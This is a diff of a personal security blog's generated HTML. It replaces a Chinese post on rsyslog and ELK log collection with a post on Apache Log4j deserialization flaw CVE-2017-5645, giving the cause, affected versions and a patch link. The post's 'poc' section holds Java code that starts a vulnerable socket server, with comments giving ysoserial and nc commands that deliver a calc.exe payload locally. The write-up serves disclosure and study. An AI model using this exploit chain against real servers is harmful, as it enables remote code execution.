@@ -8,7 +8,7 @@
   
   <meta name="author" content="c4bbage">
   
-  <title>paloalto日志转发elk1 - c4bbage blog</title>
+  <title>log4j deserialization vuln - c4bbage blog</title>
   
 
   <link rel="shortcut icon" href="../img/favicon.ico">
@@ -23,9 +23,9 @@
   
   <script>
     // Current page data
-    var mkdocs_page_name = "paloalto日志转发elk1";
-    var mkdocs_page_input_path = "paloalto2elk1.md";
-    var mkdocs_page_url = "/paloalto2elk1/";
+    var mkdocs_page_name = "log4j deserialization vuln";
+    var mkdocs_page_input_path = "log4j-deserialization-vuln.md";
+    var mkdocs_page_url = "/log4j-deserialization-vuln/";
   </script>
   
   <script src="../js/jquery-2.1.1.min.js"></script>
@@ -67,19 +67,8 @@
 
         
             
-    <li class="toctree-l1 current">
-        <a class="current" href="./">paloalto日志转发elk1</a>
-        
-            <ul>
-            
-                <li class="toctree-l3"><a href="#paloaltoelk1">paloalto日志转发到elk1</a></li>
-                
-                    <li><a class="toctree-l4" href="#paloalto">配置 paloalto</a></li>
-                
-                    <li><a class="toctree-l4" href="#rsyslog">配置 rsyslog</a></li>
-                
-            
-            </ul>
+    <li class="toctree-l1 ">
+        <a class="" href="../paloalto2elk1/">paloalto日志转发elk1</a>
         
     </li>
 
@@ -128,8 +117,23 @@
 
         
             
-    <li class="toctree-l1 ">
-        <a class="" href="../log4j-deserialization-vuln/">log4j deserialization vuln</a>
+    <li class="toctree-l1 current">
+        <a class="current" href="./">log4j deserialization vuln</a>
+        
+            <ul>
+            
+                <li class="toctree-l3"><a href="#apache-log4j-deserialization-vuln">Apache Log4j deserialization Vuln</a></li>
+                
+                    <li><a class="toctree-l4" href="#_1">简介</a></li>
+                
+                    <li><a class="toctree-l4" href="#_2">漏洞触发点</a></li>
+                
+                    <li><a class="toctree-l4" href="#_3">受影响版本</a></li>
+                
+                    <li><a class="toctree-l4" href="#poc">poc</a></li>
+                
+            
+            </ul>
         
     </li>
 
@@ -232,11 +236,11 @@
     
       
         
-          <li>工作笔记 &raquo;</li>
+          <li>兴趣关注 &raquo;</li>
         
       
     
-    <li>paloalto日志转发elk1</li>
+    <li>log4j deserialization vuln</li>
     <li class="wy-breadcrumbs-aside">
       
     </li>
@@ -246,61 +250,47 @@
           <div role="main">
             <div class="section">
               
-                <h1 id="paloaltoelk1">paloalto日志转发到elk1</h1>
+                <h1 id="apache-log4j-deserialization-vuln">Apache Log4j deserialization Vuln</h1>
 <hr />
-<p>在内网想构建个日志分析系统，便于分析蜜罐、paloalto、VPN、赛门铁克的告警日志。针对paloalto的日志采集是通过以下架构:
-paloalto -&gt; syslog -&gt; logstash -&gt; elastic search -&gt; kibana</p>
-<h2 id="paloalto">配置 paloalto</h2>
-<p>进入 paloalto 在 Device 中配置 syslog,如图:</p>
-<p><img alt="" src="../images/20170222165425.png" />
-之后在 Objects 内配置 Log Forwarding Profile,如下：</p>
-<p><img alt="" src="../images/20170222165842.png" />
-注意 Syslog,通信日志和威胁日志为不同端口。
-最后在 Policies Security 上配置上log Forwarding</p>
-<p><img alt="" src="../images/20170222170231.png" /></p>
-<h2 id="rsyslog">配置 rsyslog</h2>
-<p>安装略，主要是配置文件。
-配置文件配置方式分新旧两种方式，旧式(不影响使用)：</p>
-<pre><code>$ModLoad imtcp
-$InputTCPServerRun 515
-$AllowedSender TCP, 192.168.136.0/24
-$template Remote2,&quot;/var/log/rsyslog/%fromhost-ip%/traffic_%fromhost-ip%_%$YEAR%-%$MONTH%-%$DAY%.log&quot;
-# The above code is old-fashioned
-</code></pre>
+<h2 id="_1">简介</h2>
+<p>4月18日，Apache Log4j 被曝出存在一个反序列化漏洞(CVE-2017-5645)，攻击者可以通过发送一个特别制作的2进制payload，在组件将字节反序列化为对象时，触发并执行构造的payload代码。</p>
+<h2 id="_2">漏洞触发点</h2>
+<p>该漏洞主要是由于在处理ObjectInputStream时，接收器对于不可靠来源的input没有过滤。可以通过给TcpSocketServer和UdpSocketServer添加可配置的过滤功能以及一些相关设置，可以有效的解决该漏洞。目前Log4j官方已经发布新版本修复了该漏洞，补丁参考下载地址：http://download.nextag.com/apache/logging/log4j/2.8.2/</p>
+<h2 id="_3">受影响版本</h2>
+<p>所有Apache Log4j 2.*系列版本： Apache Log4j 2.0-alpha1 – Apache Log4j 2.8.1</p>
+<h2 id="poc">poc</h2>
+<pre><code>/*
+ * To change this license header, choose License Headers in Project Properties.
+ * To change this template file, choose Tools | Templates
+ * and open the template in the editor.
+ */
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import org.apache.logging.log4j.core.net.server.TcpSocketServer;
 
-<p>新格式为：</p>
-<pre><code># /etc/rsyslog.d/pa_traffic.conf
-module(load=&quot;imtcp&quot;)
-template (name=&quot;DynFile1&quot; type=&quot;string&quot; string=&quot;/var/log/rsyslog/%fromhost-ip%/traffic_%fromhost-ip%_%$YEAR%-%$MONTH%-%$DAY%.log&quot;)
+/**
+ *
+ * @author c4bbage
+ */
+public class Log4jpoc2 {
 
-input(type=&quot;imtcp&quot; 
-    port=&quot;515&quot;
-    ruleset=&quot;pa_traffic&quot;)
-ruleset(name=&quot;pa_traffic&quot;){
-    action(type=&quot;omfile&quot; dynaFile=&quot;DynFile1&quot;)   
+    /**
+     * @param args the command line arguments
+     */
+    public static void main(String[] args) {
+        // TODO code application logic here  
+        //java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 calc.exe &gt; calc.bin
+        //nc 127.0.0.1 12312 &lt; calc.bin
+        try {
+            TcpSocketServer&lt;ObjectInputStream&gt; tcpSocketServer = TcpSocketServer.createSerializedSocketServer(12312);
+            tcpSocketServer.run();
+        }
+        catch (Exception e){
+           //System.out.println(e.toString());
+        }
+    }
 }
-# end file 
-# /etc/rsyslog.d/pa_threat.conf
-module(load=&quot;imtcp&quot;)
-template (name=&quot;DynFile2&quot; type=&quot;string&quot; string=&quot;/var/log/rsyslog/%fromhost-ip%/threat_%fromhost-ip%_%$YEAR%-%$MONTH%-%$DAY%.log&quot;)
-
-input(type=&quot;imtcp&quot; 
-    port=&quot;513&quot;
-    ruleset=&quot;pa_threat&quot;)
-ruleset(name=&quot;pa_threat&quot;){
-    action(type=&quot;omfile&quot; dynaFile=&quot;DynFile2&quot;)   
-}
-# end file 
-# cat /etc/rsyslog.conf|grep -i include
-$IncludeConfig /etc/rsyslog.d/*.conf
 </code></pre>
-
-<p>日志生成如下:</p>
-<p><img alt="" src="../images/20170222171042.png" /></p>
-<p>参考文档</p>
-<ul>
-<li>http://rsyslog-doc.readthedocs.io</li>
-</ul>
               
             </div>
           </div>
@@ -308,10 +298,10 @@ $IncludeConfig /etc/rsyslog.d/*.conf
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="../paloalto2elk2/" class="btn btn-neutral float-right" title="paloalto日志转发elk2">Next <span class="icon icon-circle-arrow-right"></span></a>
+        <a href="../handle_csrf_token_with_burpsuite_or_sqlmap/" class="btn btn-neutral float-right" title="用Burpsuite 来处理csrf token">Next <span class="icon icon-circle-arrow-right"></span></a>
       
       
-        <a href=".." class="btn btn-neutral" title="Home"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../How_to_spend_the_workplace_arsenal/" class="btn btn-neutral" title="如何度过职场新兵期-四哥"><span class="icon icon-circle-arrow-left"></span> Previous</a>
       
     </div>
   
@@ -337,10 +327,10 @@ $IncludeConfig /etc/rsyslog.d/*.conf
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href=".." style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../How_to_spend_the_workplace_arsenal/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../paloalto2elk2/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../handle_csrf_token_with_burpsuite_or_sqlmap/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
